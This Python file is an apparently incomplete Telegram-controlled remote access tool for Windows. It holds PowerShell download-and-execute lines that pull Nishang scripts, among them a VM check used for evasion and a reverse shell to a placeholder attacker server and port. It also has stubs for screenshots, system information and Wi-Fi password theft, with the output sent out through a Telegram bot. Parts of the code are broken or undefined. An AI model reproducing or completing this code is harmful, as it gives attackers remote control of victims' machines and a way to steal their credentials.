from socket import MsgFlag
import subprocess
import os



InstallModule = 'Install-Module -Name "PoshGram" -Scope CurrentUser'

CheckVM = "powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Check-VM.ps1');Check-VM"

Systeminfo = ""
# Webcam  = ""
WifiStealer = ""
command = "powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]"



def sendmsg(token,chatid,msg):
    command = '-command { Import-Module PoshGram;$token = '+token+';$chat = "-'+int(chatid)+'";Send-TelegramTextMessage -BotToken $token -ChatID $chat -Message '+msg+' }'
    subprocess.Popen(command)

def sendphoto(token,chatid,photopath):
    command = '-command { Import-Module PoshGram;$token = '+token+';$chat = "-'+int(chatid)+'";Send-TelegramLocalPhoto -BotToken $botToken -ChatID $chat -PhotoPath $'+photopath


def getmsg():
    pass

def sendscreenshot():
    Screenshot = "powershell iex (New-Object Net.WebClient).DownloadString('')"
    sendphoto(photopath="Screenshot.png")
    os.remove("Screenshot.png")


def systeminfo():
    pass

def wifiStealer():
    pass

def speak(command):
    speakcommand = "powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Misc/Speak.ps1');Speak "
    speakcommand += command
    



while run:
    try:
        query = getmsg()
        if query == "/screenshot":
            sendscreenshot()
        if query=="/systeminfo":
            systeminfo()
        if query=="/wifistealer":
            wifiStealer()
        if query=="/exit":
            run = False
        if query.startswith("/speak"):
            word = query.replace("/speak","")
            speak(word)
        else:
            continue

    except Exception as e:
        print(e)
        pass